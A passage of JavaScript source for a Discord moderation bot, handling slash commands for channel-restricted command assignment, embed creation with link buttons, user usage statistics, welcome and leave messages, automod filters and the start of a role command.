          name: `Channels ${index * channelsPerField + 1}-${Math.min((index + 1) * channelsPerField, textChannels.length)}`,
          value: channelList,
          inline: false
        });
      });

      embed.addFields({
        name: 'How to assign',
        value: `Use \`/commandassign mode:assign channel:#channel-name command:${commandName}\` to assign this command to a specific channel.`,
        inline: false
      });

      await interaction.reply({ embeds: [embed] });
    } else {
      // Assign mode - assign to specific channel
      if (!targetChannel) {
        return interaction.reply({
          content: '<:no:1393890945929318542> Please select a channel when using assign mode.',
          ephemeral: true
        });
      }

      // Ensure channel is a text channel
      if (targetChannel.type !== 0) { // 0 = GUILD_TEXT
        return interaction.reply({
          content: '<:no:1393890945929318542> Please select a text channel.',
          ephemeral: true
        });
      }

      // Get or create guild assignments
      let guildAssignments = commandChannelAssignments.get(interaction.guild.id);
      if (!guildAssignments) {
        guildAssignments = {};
        commandChannelAssignments.set(interaction.guild.id, guildAssignments);
      }

      // Initialize or get current assignments for this command
      if (!guildAssignments[commandName]) {
        guildAssignments[commandName] = [];
      }

      // Check if channel is already assigned
      if (guildAssignments[commandName].includes(targetChannel.id)) {
        return interaction.reply({
          content: `<:no:1393890945929318542> Command **/${commandName}** is already assigned to ${targetChannel}.`,
          ephemeral: true
        });
      }

      // Add channel to assignments
      guildAssignments[commandName].push(targetChannel.id);

      // Save to Firebase
      await saveCommandAssignments(interaction.guild.id, guildAssignments);

      const totalAssigned = guildAssignments[commandName].length;
      const allAssignedChannels = guildAssignments[commandName].map(id => `<#${id}>`).join(', ');

      const embed = new EmbedBuilder()
        .setColor(0x00d4ff)
        .setTitle('Command Assignment Updated')
        .setDescription(`Command **/${commandName}** has been assigned to ${targetChannel}.`)
        .addFields(
          { name: 'Command', value: `\`/${commandName}\``, inline: true },
          { name: 'New Channel', value: `${targetChannel}`, inline: true },
          { name: 'Total Assigned', value: `${totalAssigned} channel${totalAssigned > 1 ? 's' : ''}`, inline: true },
          { name: 'All Assigned Channels', value: allAssignedChannels, inline: false },
          { name: 'Assigned by', value: `${interaction.user.tag}`, inline: true }
        )
        .setTimestamp()
        .setFooter({
          text: `Guild ID: ${interaction.guild.id}`,
          iconURL: interaction.user.displayAvatarURL()
        });

      await interaction.reply({ embeds: [embed] });
    }
  }

  if (interaction.commandName === 'removecommand') {
    const commandName = interaction.options.getString('command');
    const targetChannel = interaction.options.getChannel('channel');
    commandStats.removecommand++;

    // Double-check permissions (already checked above, but good practice)
    const isOwnerOrBotOwner = interaction.guild.ownerId === interaction.user.id || isBotOwner(interaction.user.id);
    
    if (!isOwnerOrBotOwner) {
      return interaction.reply({
        content: '<:no:1393890945929318542> Only bot owners and server owners can use this command.',
        ephemeral: true
      });
    }

    // Get guild assignments
    let guildAssignments = commandChannelAssignments.get(interaction.guild.id);
    if (!guildAssignments || !guildAssignments[commandName] || guildAssignments[commandName].length === 0) {
      return interaction.reply({
        content: `<:no:1393890945929318542> Command **/${commandName}** is not assigned to any channels.`,
        ephemeral: true
      });
    }

    if (targetChannel) {
      // Remove from specific channel
      if (targetChannel.type !== 0) { // 0 = GUILD_TEXT
        return interaction.reply({
          content: '<:no:1393890945929318542> Please select a text channel.',
          ephemeral: true
        });
      }

      const channelIndex = guildAssignments[commandName].indexOf(targetChannel.id);
      if (channelIndex === -1) {
        return interaction.reply({
          content: `<:no:1393890945929318542> Command **/${commandName}** is not assigned to ${targetChannel}.`,
          ephemeral: true
        });
      }

      // Remove the channel from assignments
      guildAssignments[commandName].splice(channelIndex, 1);

      // Save to Firebase
      await saveCommandAssignments(interaction.guild.id, guildAssignments);

      const remainingAssignments = guildAssignments[commandName].length;
      let remainingText = 'None (usable anywhere)';
      if (remainingAssignments > 0) {
        remainingText = guildAssignments[commandName].map(id => `<#${id}>`).join(', ');
      }

      const embed = new EmbedBuilder()
        .setColor(0xff6b6b)
        .setTitle('Command Assignment Removed')
        .setDescription(`Command **/${commandName}** has been removed from ${targetChannel}.`)
        .addFields(
          { name: 'Command', value: `\`/${commandName}\``, inline: true },
          { name: 'Removed from', value: `${targetChannel}`, inline: true },
          { name: 'Remaining Assignments', value: remainingText, inline: false },
          { name: 'Removed by', value: `${interaction.user.tag}`, inline: true }
        )
        .setTimestamp()
        .setFooter({
          text: `Guild ID: ${interaction.guild.id}`,
          iconURL: interaction.user.displayAvatarURL()
        });

      await interaction.reply({ embeds: [embed] });
    } else {
      // Remove from all channels
      const removedCount = guildAssignments[commandName].length;
      const removedChannels = guildAssignments[commandName].map(id => `<#${id}>`).join(', ');
      
      // Clear all assignments
      guildAssignments[commandName] = [];

      // Save to Firebase
      await saveCommandAssignments(interaction.guild.id, guildAssignments);

      const embed = new EmbedBuilder()
        .setColor(0xff6b6b)
        .setTitle('All Command Assignments Removed')
        .setDescription(`Command **/${commandName}** has been removed from all assigned channels.`)
        .addFields(
          { name: 'Command', value: `\`/${commandName}\``, inline: true },
          { name: 'Removed from', value: `${removedCount} channel${removedCount > 1 ? 's' : ''}`, inline: true },
          { name: 'Channels', value: removedChannels, inline: false },
          { name: 'Status', value: 'Command is now usable everywhere', inline: true },
          { name: 'Removed by', value: `${interaction.user.tag}`, inline: true }
        )
        .setTimestamp()
        .setFooter({
          text: `Guild ID: ${interaction.guild.id}`,
          iconURL: interaction.user.displayAvatarURL()
        });

      await interaction.reply({ embeds: [embed] });
    }
  }

  if (interaction.commandName === 'embedcreate') {
    const targetChannel = interaction.options.getChannel('channel');
    const title = interaction.options.getString('title');
    const description = interaction.options.getString('description');
    const colorInput = interaction.options.getString('color');
    const thumbnail = interaction.options.getString('thumbnail');
    const image = interaction.options.getString('image');
    const footer = interaction.options.getString('footer');
    const addTimestamp = interaction.options.getBoolean('timestamp') || false;
    const buttonsInput = interaction.options.getString('buttons');
    commandStats.embedcreate++;

    // Check if user is owner or has administrator permission
    const isOwnerOrAdmin = interaction.guild.ownerId === interaction.user.id || 
                          interaction.member.permissions.has(PermissionFlagsBits.Administrator);

    if (!isOwnerOrAdmin) {
      return interaction.reply({
        content: '<:no:1393890945929318542> Only server owners and administrators can use this command.',
        ephemeral: true
      });
    }

    // Validate channel type
    if (targetChannel.type !== 0) { // 0 = GUILD_TEXT
      return interaction.reply({
        content: '<:no:1393890945929318542> Please select a text channel.',
        ephemeral: true
      });
    }

    // Parse color input
    let color = 0x0099ff; // Default blue color
    if (colorInput) {
      // Handle hex colors
      if (colorInput.startsWith('#')) {
        const hexColor = parseInt(colorInput.slice(1), 16);
        if (!isNaN(hexColor)) {
          color = hexColor;
        }
      } else if (colorInput.startsWith('0x')) {
        const hexColor = parseInt(colorInput, 16);
        if (!isNaN(hexColor)) {
          color = hexColor;
        }
      } else {
        // Handle color names
        const colorNames = {
          'red': 0xff0000,
          'green': 0x00ff00,
          'blue': 0x0000ff,
          'yellow': 0xffff00,
          'orange': 0xffa500,
          'purple': 0x800080,
          'pink': 0xffc0cb,
          'cyan': 0x00ffff,
          'magenta': 0xff00ff,
          'lime': 0x00ff00,
          'black': 0x000000,
          'white': 0xffffff,
          'gray': 0x808080,
          'grey': 0x808080,
          'silver': 0xc0c0c0,
          'gold': 0xffd700,
          'navy': 0x000080,
          'teal': 0x008080,
          'maroon': 0x800000,
          'olive': 0x808000
        };
        
        const lowerColor = colorInput.toLowerCase();
        if (colorNames[lowerColor]) {
          color = colorNames[lowerColor];
        }
      }
    }

    try {
      const embed = new EmbedBuilder()
        .setColor(color)
        .setTitle(title)
        .setDescription(description);

      // Add optional elements
      if (thumbnail) {
        try {
          new URL(thumbnail); // Validate URL
          embed.setThumbnail(thumbnail);
        } catch {
          return interaction.reply({
            content: '<:no:1393890945929318542> Invalid thumbnail URL provided.',
            ephemeral: true
          });
        }
      }

      if (image) {
        try {
          new URL(image); // Validate URL
          embed.setImage(image);
        } catch {
          return interaction.reply({
            content: '<:no:1393890945929318542> Invalid image URL provided.',
            ephemeral: true
          });
        }
      }

      if (footer) {
        embed.setFooter({
          text: footer,
          iconURL: interaction.user.displayAvatarURL()
        });
      }

      if (addTimestamp) {
        embed.setTimestamp();
      }

      // Parse and create buttons
      const actionRows = [];
      if (buttonsInput) {
        try {
          // Split buttons by | separator
          const buttonPairs = buttonsInput.split('|');
          
          if (buttonPairs.length > 5) {
            return interaction.reply({
              content: '<:no:1393890945929318542> Maximum 5 buttons allowed.',
              ephemeral: true
            });
          }

          const buttons = [];
          let buttonId = 1;

          // Helper function to parse emoji and create button
          function parseEmojiAndButton(rawButton) {
            // Match optional emoji, label, and URL - supports both <:name:id> and <a:name:id>
            const emojiMatch = rawButton.match(/^<(a?):([a-zA-Z0-9_]+):(\d+)>\s*(.*?),\s*(https?:\/\/\S+)$/);

            if (emojiMatch) {
              const animated = emojiMatch[1] === 'a';
              const name = emojiMatch[2];
              const id = emojiMatch[3];
              const label = emojiMatch[4].trim();
              const url = emojiMatch[5].trim();

              return {
                button: new ButtonBuilder()
                  .setLabel(label)
                  .setStyle(ButtonStyle.Link)
                  .setURL(url)
                  .setEmoji({ name, id, animated }),
                label,
                url
              };
            } else {
              // Fallback if no emoji - standard format
              const [label, url] = rawButton.split(',').map(s => s.trim());
              return {
                button: new ButtonBuilder()
                  .setLabel(label)
                  .setStyle(ButtonStyle.Link)
                  .setURL(url),
                label,
                url
              };
            }
          }

          for (const pair of buttonPairs) {
            try {
              const parsed = parseEmojiAndButton(pair);
              
              if (!parsed.label || !parsed.url) {
                return interaction.reply({
                  content: '<:no:1393890945929318542> Invalid button format. Use: "Label,URL" or "<:emoji:id> Label,URL" or "<a:emoji:id> Label,URL"',
                  ephemeral: true
                });
              }

              // Validate URL
              try {
                new URL(parsed.url);
              } catch {
                return interaction.reply({
                  content: `<:no:1393890945929318542> Invalid URL for button "${parsed.label}": ${parsed.url}`,
                  ephemeral: true
                });
              }

              if (parsed.label.length > 80) {
                return interaction.reply({
                  content: `<:no:1393890945929318542> Button label "${parsed.label}" is too long (max 80 characters).`,
                  ephemeral: true
                });
              }

              buttons.push(parsed.button);
              buttonId++;
            } catch (error) {
              return interaction.reply({
                content: `<:no:1393890945929318542> Error parsing button: "${pair}". Check format and try again.`,
                ephemeral: true
              });
            }
          }

          // Create action rows (max 5 buttons per row)
          while (buttons.length > 0) {
            const rowButtons = buttons.splice(0, 5);
            const actionRow = new ActionRowBuilder().addComponents(rowButtons);
            actionRows.push(actionRow);
          }

        } catch (error) {
          console.error('Button parsing error:', error);
          return interaction.reply({
            content: '<:no:1393890945929318542> Error parsing buttons. Format: "Label1,URL1|Label2,URL2|Label3,URL3"',
            ephemeral: true
          });
        }
      }

      // Generate unique embed ID
      const embedId = `embed_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;

      // Prepare message payload
      const messageOptions = { 
        embeds: [embed]
      };
      
      if (actionRows.length > 0) {
        messageOptions.components = actionRows;
      }

      // Send the embed to the channel
      let sentMessage;
      try {
        sentMessage = await targetChannel.send(messageOptions);
        console.log(`Embed sent to channel ${targetChannel.name}, message ID: ${sentMessage.id}`);
      } catch (error) {
        console.error('Error sending embed to channel:', error);
        return interaction.reply({
          content: '<:no:1393890945929318542> Failed to send embed to channel. Please check bot permissions and try again.',
          ephemeral: true
        });
      }

      // Store embed data in database
      const embedData = {
        id: embedId,
        title,
        description,
        color: colorInput || null,
        thumbnail: thumbnail || null,
        image: image || null,
        footer: footer || null,
        timestamp: addTimestamp,
        buttons: buttonsInput || null,
        createdBy: interaction.user.id,
        createdAt: Date.now(),
        guildId: interaction.guild.id,
        channelId: targetChannel.id,
        messageId: sentMessage.id
      };

      await saveEmbed(interaction.guild.id, embedId, embedData);

      // Send confirmation to user
      const confirmationEmbed = new EmbedBuilder()
        .setColor(0x00ff88)
        .setTitle('✅ Embed Created Successfully')
        .setDescription(`Embed has been sent to ${targetChannel} and saved with ID: \`${embedId}\``)
        .addFields(
          { name: 'Embed ID', value: `\`${embedId}\``, inline: true },
          { name: 'Channel', value: `${targetChannel}`, inline: true },
          { name: 'Message ID', value: `\`${sentMessage.id}\``, inline: true },
          { name: 'Status', value: '✅ Successfully sent to channel', inline: false }
        )
        .setTimestamp()
        .setFooter({
          text: `Created by ${interaction.user.tag}`,
          iconURL: interaction.user.displayAvatarURL()
        });

      await interaction.reply({ embeds: [confirmationEmbed], ephemeral: true });

    } catch (error) {
      console.error('Embed creation error:', error);
      await interaction.reply({
        content: '<:no:1393890945929318542> Failed to create embed. Please check your inputs and try again.',
        ephemeral: true
      });
    }
  }

  if (interaction.commandName === 'stats') {
    const targetUser = interaction.options.getUser('user') || interaction.user;
    commandStats.stats++;

    // Get user stats from the database
    const guildUserStats = userStats.get(interaction.guild.id);
    if (!guildUserStats || !guildUserStats.has(targetUser.id)) {
      return interaction.reply({
        content: `<:no:1393890945929318542> No command usage data found for ${targetUser === interaction.user ? 'you' : targetUser.username}.`,
        ephemeral: true
      });
    }

    const userData = guildUserStats.get(targetUser.id);
    const totalCommands = Object.values(userData.commands).reduce((a, b) => a + b, 0);
    
    // Get member to check join date
    let joinDate = userData.joinDate;
    try {
      const member = await interaction.guild.members.fetch(targetUser.id);
      joinDate = member.joinedTimestamp;
    } catch (error) {
      // Use stored join date if member fetch fails
    }

    // Sort commands by usage
    const sortedCommands = Object.entries(userData.commands)
      .sort(([,a], [,b]) => b - a)
      .slice(0, 10); // Top 10 commands

    const embed = new EmbedBuilder()
      .setColor(0x0ea5e9)
      .setTitle(`${targetUser === interaction.user ? 'Your' : `${targetUser.username}'s`} Command Statistics`)
      .setDescription(`Statistical overview for ${targetUser.tag}`)
      .setThumbnail(targetUser.displayAvatarURL())
      .addFields(
        { name: 'Total Commands Used', value: `${totalCommands}`, inline: true },
        { name: 'Last Command Used', value: userData.lastUsed ? `<t:${Math.floor(userData.lastUsed / 1000)}:R>` : 'Never', inline: true },
        { name: 'Joined Server', value: `<t:${Math.floor(joinDate / 1000)}:F>`, inline: true }
      )
      .setTimestamp()
      .setFooter({
        text: `Requested by ${interaction.user.tag}`,
        iconURL: interaction.user.displayAvatarURL()
      });

    if (sortedCommands.length > 0) {
      const commandList = sortedCommands
        .map(([cmd, count]) => `\`/${cmd}\` - ${count} time${count > 1 ? 's' : ''}`)
        .join('\n');
      
      embed.addFields({
        name: 'Most Used Commands',
        value: commandList,
        inline: false
      });
    } else {
      embed.addFields({
        name: 'Most Used Commands',
        value: 'No commands used yet',
        inline: false
      });
    }

    await interaction.reply({ embeds: [embed] });
  }

  if (interaction.commandName === 'setwelcome') {
    const channel = interaction.options.getChannel('channel');
    const message = interaction.options.getString('message');
    const mode = interaction.options.getString('mode') || 'single';
    commandStats.setwelcome++;

    if (channel.type !== 0) { // Must be text channel
      return interaction.reply({
        content: '<:no:1393890945929318542> Please select a text channel.',
        ephemeral: true
      });
    }

    // Get or create guild settings
    let settings = guildSettings.get(interaction.guild.id);
    if (!settings) {
      settings = {};
      guildSettings.set(interaction.guild.id, settings);
    }

    settings.welcomeChannel = channel.id;

    // Initialize welcomeMessages array if it doesn't exist
    if (!settings.welcomeMessages) {
      settings.welcomeMessages = ['Welcome {user} to {server}! You are the {membercount} member!'];
    }

    let embed;

    switch (mode) {
      case 'single':
        if (message) {
          settings.welcomeMessages = [message];
        }
        
        // Save to Firebase
        await saveGuildSettings(interaction.guild.id, settings);
        
        const exampleMessage = (message || settings.welcomeMessages[0])
          .replace(/{user}/g, `<@${interaction.user.id}>`)
          .replace(/{username}/g, interaction.user.username)
          .replace(/{displayname}/g, interaction.user.displayName || interaction.user.username)
          .replace(/{mention}/g, `<@${interaction.user.id}>`)
          .replace(/{server}/g, `**${interaction.guild.name}**`)
          .replace(/{membercount}/g, `**343rd**`);

        const exampleEmbed = new EmbedBuilder()
          .setColor(0x00ff88)
          .setDescription(exampleMessage)
          .setThumbnail(interaction.user.displayAvatarURL({ size: 128 }))
          .setTimestamp()
          .setFooter({
            text: `Welcome to ${interaction.guild.name}`,
            iconURL: interaction.guild.iconURL()
          });

        embed = new EmbedBuilder()
          .setColor(0x00ff88)
          .setTitle('Welcome Message Settings Updated')
          .setDescription('Welcome message configuration has been saved. Here\'s how it will look:')
          .addFields(
            { name: 'Channel', value: `${channel}`, inline: true },
            { name: 'Mode', value: 'Single message', inline: true },
            { name: 'Variables', value: '`{user}` - User\'s display name (bold)\n`{username}` - User\'s username\n`{displayname}` - User\'s display name\n`{mention}` - Mentions the user\n`{server}` - Server name\n`{membercount}` - Member count with ordinal suffix', inline: false }
          )
          .setTimestamp()
          .setFooter({
            text: `Set by ${interaction.user.tag}`,
            iconURL: interaction.user.displayAvatarURL()
          });

        await interaction.reply({ embeds: [embed] });
        await interaction.followUp({ embeds: [exampleEmbed] });
        break;

      case 'add':
        if (!message) {
          return interaction.reply({
            content: '<:no:1393890945929318542> Please provide a message or messages to add to the rotation (separate multiple messages with commas).',
            ephemeral: true
          });
        }

        // Split by comma and clean up each message
        const messagesToAdd = message.split(',').map(msg => msg.trim()).filter(msg => msg.length > 0);
        
        if (messagesToAdd.length === 0) {
          return interaction.reply({
            content: '<:no:1393890945929318542> No valid messages found. Please provide at least one message.',
            ephemeral: true
          });
        }

        // Add all messages to the array
        settings.welcomeMessages.push(...messagesToAdd);
        
        // Save to Firebase
        await saveGuildSettings(interaction.guild.id, settings);

        const messageList = messagesToAdd.map((msg, index) => `**${index + 1}.** ${msg}`).join('\n');

        embed = new EmbedBuilder()
          .setColor(0x00ff88)
          .setTitle('Welcome Messages Added')
          .setDescription(`Added ${messagesToAdd.length} new welcome message${messagesToAdd.length > 1 ? 's' : ''} to rotation. You now have ${settings.welcomeMessages.length} total messages.`)
          .addFields(
            { name: 'Channel', value: `${channel}`, inline: true },
            { name: 'Total Messages', value: `${settings.welcomeMessages.length}`, inline: true },
            { name: `New Message${messagesToAdd.length > 1 ? 's' : ''}`, value: messageList, inline: false }
          )
          .setTimestamp()
          .setFooter({
            text: `Added by ${interaction.user.tag}`,
            iconURL: interaction.user.displayAvatarURL()
          });

        await interaction.reply({ embeds: [embed] });
        break;

      case 'list':
        const welcomeMessagesList = settings.welcomeMessages.map((msg, index) => `**${index + 1}.** ${msg}`).join('\n\n');
        
        embed = new EmbedBuilder()
          .setColor(0x0ea5e9)
          .setTitle('Welcome Messages List')
          .setDescription(welcomeMessagesList || 'No welcome messages configured.')
          .addFields(
            { name: 'Channel', value: `${channel}`, inline: true },
            { name: 'Total Messages', value: `${settings.welcomeMessages.length}`, inline: true },
            { name: 'Rotation', value: 'Random selection on each join', inline: true }
          )
          .setTimestamp()
          .setFooter({
            text: `Requested by ${interaction.user.tag}`,
            iconURL: interaction.user.displayAvatarURL()
          });

        await interaction.reply({ embeds: [embed] });
        break;

      case 'clear':
        settings.welcomeMessages = ['Welcome {user} to {server}! You are the {membercount} member!'];
        
        // Save to Firebase
        await saveGuildSettings(interaction.guild.id, settings);
        
        embed = new EmbedBuilder()
          .setColor(0xff6b6b)
          .setTitle('Welcome Messages Cleared')
          .setDescription('All welcome messages have been cleared and reset to default.')
          .addFields(
            { name: 'Channel', value: `${channel}`, inline: true },
            { name: 'Status', value: 'Reset to default message', inline: true }
          )
          .setTimestamp()
          .setFooter({
            text: `Cleared by ${interaction.user.tag}`,
            iconURL: interaction.user.displayAvatarURL()
          });

        await interaction.reply({ embeds: [embed] });
        break;
    }
  }

  if (interaction.commandName === 'setleave') {
    const channel = interaction.options.getChannel('channel');
    const message = interaction.options.getString('message');
    const mode = interaction.options.getString('mode') || 'single';
    commandStats.setleave++;

    if (channel.type !== 0) { // Must be text channel
      return interaction.reply({
        content: '<:no:1393890945929318542> Please select a text channel.',
        ephemeral: true
      });
    }

    // Get or create guild settings
    let settings = guildSettings.get(interaction.guild.id);
    if (!settings) {
      settings = {};
      guildSettings.set(interaction.guild.id, settings);
    }

    settings.leaveChannel = channel.id;

    // Initialize leaveMessages array if it doesn't exist
    if (!settings.leaveMessages) {
      settings.leaveMessages = ['{username} has left {server}. We\'ll miss you! 👋'];
    }

    let embed;

    switch (mode) {
      case 'single':
        if (message) {
          settings.leaveMessages = [message];
        }
        
        // Save to Firebase
        await saveGuildSettings(interaction.guild.id, settings);
        
        const exampleMessage = (message || settings.leaveMessages[0])
          .replace(/{user}/g, `<@${interaction.user.id}>`)
          .replace(/{username}/g, interaction.user.username)
          .replace(/{displayname}/g, interaction.user.displayName || interaction.user.username)
          .replace(/{mention}/g, `<@${interaction.user.id}>`)
          .replace(/{server}/g, `**${interaction.guild.name}**`)
          .replace(/{membercount}/g, `**342nd**`);

        const exampleEmbed = new EmbedBuilder()
          .setColor(0xff6b6b)
          .setDescription(exampleMessage)
          .setThumbnail(interaction.user.displayAvatarURL({ size: 128 }))
          .setTimestamp()
          .setFooter({
            text: `Goodbye from ${interaction.guild.name}`,
            iconURL: interaction.guild.iconURL()
          });

        embed = new EmbedBuilder()
          .setColor(0xff6b6b)
          .setTitle('Leave Message Settings Updated')
          .setDescription('Leave message configuration has been saved. Here\'s how it will look:')
          .addFields(
            { name: 'Channel', value: `${channel}`, inline: true },
            { name: 'Mode', value: 'Single message', inline: true },
            { name: 'Variables', value: '`{user}` - User\'s display name (bold)\n`{username}` - User\'s username\n`{displayname}` - User\'s display name\n`{mention}` - Mentions the user\n`{server}` - Server name\n`{membercount}` - Member count with ordinal suffix', inline: false }
          )
          .setTimestamp()
          .setFooter({
            text: `Set by ${interaction.user.tag}`,
            iconURL: interaction.user.displayAvatarURL()
          });

        await interaction.reply({ embeds: [embed] });
        await interaction.followUp({ embeds: [exampleEmbed] });
        break;

      case 'add':
        if (!message) {
          return interaction.reply({
            content: '<:no:1393890945929318542> Please provide a message or messages to add to the rotation (separate multiple messages with commas).',
            ephemeral: true
          });
        }

        // Split by comma and clean up each message
        const messagesToAdd = message.split(',').map(msg => msg.trim()).filter(msg => msg.length > 0);
        
        if (messagesToAdd.length === 0) {
          return interaction.reply({
            content: '<:no:1393890945929318542> No valid messages found. Please provide at least one message.',
            ephemeral: true
          });
        }

        // Add all messages to the array
        settings.leaveMessages.push(...messagesToAdd);
        
        // Save to Firebase
        await saveGuildSettings(interaction.guild.id, settings);

        const messageList = messagesToAdd.map((msg, index) => `**${index + 1}.** ${msg}`).join('\n');

        embed = new EmbedBuilder()
          .setColor(0xff6b6b)
          .setTitle('Leave Messages Added')
          .setDescription(`Added ${messagesToAdd.length} new leave message${messagesToAdd.length > 1 ? 's' : ''} to rotation. You now have ${settings.leaveMessages.length} total messages.`)
          .addFields(
            { name: 'Channel', value: `${channel}`, inline: true },
            { name: 'Total Messages', value: `${settings.leaveMessages.length}`, inline: true },
            { name: `New Message${messagesToAdd.length > 1 ? 's' : ''}`, value: messageList, inline: false }
          )
          .setTimestamp()
          .setFooter({
            text: `Added by ${interaction.user.tag}`,
            iconURL: interaction.user.displayAvatarURL()
          });

        await interaction.reply({ embeds: [embed] });
        break;

      case 'list':
        const leaveMessagesList = settings.leaveMessages.map((msg, index) => `**${index + 1}.** ${msg}`).join('\n\n');
        
        embed = new EmbedBuilder()
          .setColor(0x0ea5e9)
          .setTitle('Leave Messages List')
          .setDescription(leaveMessagesList || 'No leave messages configured.')
          .addFields(
            { name: 'Channel', value: `${channel}`, inline: true },
            { name: 'Total Messages', value: `${settings.leaveMessages.length}`, inline: true },
            { name: 'Rotation', value: 'Random selection on each leave', inline: true }
          )
          .setTimestamp()
          .setFooter({
            text: `Requested by ${interaction.user.tag}`,
            iconURL: interaction.user.displayAvatarURL()
          });

        await interaction.reply({ embeds: [embed] });
        break;

      case 'clear':
        settings.leaveMessages = ['{username} has left {server}. We\'ll miss you! '];
        
        // Save to Firebase
        await saveGuildSettings(interaction.guild.id, settings);
        
        embed = new EmbedBuilder()
          .setColor(0xff6b6b)
          .setTitle('Leave Messages Cleared')
          .setDescription('All leave messages have been cleared and reset to default.')
          .addFields(
            { name: 'Channel', value: `${channel}`, inline: true },
            { name: 'Status', value: 'Reset to default message', inline: true }
          )
          .setTimestamp()
          .setFooter({
            text: `Cleared by ${interaction.user.tag}`,
            iconURL: interaction.user.displayAvatarURL()
          });

        await interaction.reply({ embeds: [embed] });
        break;
    }
  }

  if (interaction.commandName === 'automod') {
    const setting = interaction.options.getString('setting');
    const word = interaction.options.getString('word');
    commandStats.automod++;

    // Get or create auto-mod settings with proper defaults
    let autoMod = autoModSettings.get(interaction.guild.id);
    if (!autoMod) {
      autoMod = {
        linkFilter: true,
        badWordFilter: true,
        badWords: [...defaultBadWords]
      };
      autoModSettings.set(interaction.guild.id, autoMod);
      // Save to Firebase immediately
      await saveAutoModSettings(interaction.guild.id, autoMod);
    }

    let embed;

    switch (setting) {
      case 'link_on':
        autoMod.linkFilter = true;
        await saveAutoModSettings(interaction.guild.id, autoMod);
        embed = new EmbedBuilder()
          .setColor(0x00ff88)
          .setTitle('Link Filter Enabled')
          .setDescription('Automatic link detection and deletion is now active.');
        break;

      case 'link_off':
        autoMod.linkFilter = false;
        await saveAutoModSettings(interaction.guild.id, autoMod);
        embed = new EmbedBuilder()
          .setColor(0xff6b6b)
          .setTitle('Link Filter Disabled')
          .setDescription('Automatic link detection and deletion is now inactive.');
        break;

      case 'word_on':
        autoMod.badWordFilter = true;
        await saveAutoModSettings(interaction.guild.id, autoMod);
        embed = new EmbedBuilder()
          .setColor(0x00ff88)
          .setTitle('Bad Word Filter Enabled')
          .setDescription('Automatic inappropriate content detection is now active.');
        break;

      case 'word_off':
        autoMod.badWordFilter = false;
        await saveAutoModSettings(interaction.guild.id, autoMod);
        embed = new EmbedBuilder()
          .setColor(0xff6b6b)
          .setTitle('Bad Word Filter Disabled')
          .setDescription('Automatic inappropriate content detection is now inactive.');
        break;

      case 'add_word':
        if (!word) {
          return interaction.reply({
            content: '<:no:1393890945929318542> Please provide a word or words to add (separate multiple words with commas).',
            ephemeral: true
          });
        }
        
        // Split by comma and clean up each word
        const wordsToAdd = word.split(',').map(w => w.trim().toLowerCase()).filter(w => w.length > 0);
        const newWords = [];
        const existingWords = [];
        
        for (const wordToAdd of wordsToAdd) {
          if (!autoMod.badWords.includes(wordToAdd)) {
            autoMod.badWords.push(wordToAdd);
            newWords.push(wordToAdd);
          } else {
            existingWords.push(wordToAdd);
          }
        }
        
        if (newWords.length > 0) {
          await saveAutoModSettings(interaction.guild.id, autoMod);
          let description = `Added ${newWords.length} word${newWords.length > 1 ? 's' : ''} to the bad words list:\n${newWords.map(w => `\`${w}\``).join(', ')}`;
          if (existingWords.length > 0) {
            description += `\n\nSkipped ${existingWords.length} word${existingWords.length > 1 ? 's' : ''} (already exists):\n${existingWords.map(w => `\`${w}\``).join(', ')}`;
          }
          
          embed = new EmbedBuilder()
            .setColor(0x00ff88)
            .setTitle('Bad Words Added')
            .setDescription(description);
        } else {
          return interaction.reply({
            content: '<:no:1393890945929318542> All provided words are already in the bad words list.',
            ephemeral: true
          });
        }
        break;

      case 'remove_word':
        if (!word) {
          return interaction.reply({
            content: '<:no:1393890945929318542> Please provide a word or words to remove (separate multiple words with commas).',
            ephemeral: true
          });
        }
        
        // Split by comma and clean up each word
        const wordsToRemove = word.split(',').map(w => w.trim().toLowerCase()).filter(w => w.length > 0);
        const removedWords = [];
        const notFoundWords = [];
        
        for (const wordToRemove of wordsToRemove) {
          const index = autoMod.badWords.indexOf(wordToRemove);
          if (index > -1) {
            autoMod.badWords.splice(index, 1);
            removedWords.push(wordToRemove);
          } else {
            notFoundWords.push(wordToRemove);
          }
        }
        
        if (removedWords.length > 0) {
          await saveAutoModSettings(interaction.guild.id, autoMod);
          let description = `Removed ${removedWords.length} word${removedWords.length > 1 ? 's' : ''} from the bad words list:\n${removedWords.map(w => `\`${w}\``).join(', ')}`;
          if (notFoundWords.length > 0) {
            description += `\n\nCouldn't find ${notFoundWords.length} word${notFoundWords.length > 1 ? 's' : ''}:\n${notFoundWords.map(w => `\`${w}\``).join(', ')}`;
          }
          
          embed = new EmbedBuilder()
            .setColor(0xff6b6b)
            .setTitle('Bad Words Removed')
            .setDescription(description);
        } else {
          return interaction.reply({
            content: '<:no:1393890945929318542> None of the provided words were found in the bad words list.',
            ephemeral: true
          });
        }
        break;

      case 'list_words':
        const wordList = autoMod.badWords.length > 0 ? 
          autoMod.badWords.slice(0, 20).map(w => `\`${w}\``).join(', ') + 
          (autoMod.badWords.length > 20 ? ` +${autoMod.badWords.length - 20} more` : '') :
          'No bad words configured';
        
        embed = new EmbedBuilder()
          .setColor(0x0ea5e9)
          .setTitle('Bad Words List')
          .setDescription(wordList)
          .addFields(
            { name: 'Total Words', value: `${autoMod.badWords.length}`, inline: true }
          );
        break;

      case 'show':
        embed = new EmbedBuilder()
          .setColor(0x0ea5e9)
          .setTitle('Auto-Moderation Settings')
          .setDescription('Current auto-moderation configuration')
          .addFields(
            { name: 'Link Filter', value: autoMod.linkFilter ? '<:yes:1393890949960306719> Enabled' : '<:no:1393890945929318542> Disabled', inline: true },
            { name: 'Bad Word Filter', value: autoMod.badWordFilter ? '<:yes:1393890949960306719> Enabled' : '<:no:1393890945929318542> Disabled', inline: true },
            { name: 'Bad Words Count', value: `${autoMod.badWords.length} words`, inline: true },
            { name: 'Bypass Permissions', value: 'Administrators and Moderators can bypass link filter', inline: false }
          );
        break;
    }

    embed.setTimestamp()
      .setFooter({
        text: `Updated by ${interaction.user.tag}`,
        iconURL: interaction.user.displayAvatarURL()
      });

    await interaction.reply({ embeds: [embed] });
  }

  if (interaction.commandName === 'addrole') {
    const mode = interaction.options.getString('mode');
    const role = interaction.options.getRole('role');
    const targetUser = interaction.options.getUser('user');
    commandStats.addrole++;

    // Check if user is owner or has administrator permission
    const isOwnerOrAdmin = interaction.guild.ownerId === interaction.user.id || 
                          interaction.member.permissions.has(PermissionFlagsBits.Administrator);

    if (!isOwnerOrAdmin) {
      return interaction.reply({
        content: '<:no:1393890945929318542> Only server owners and administrators can use this command.',
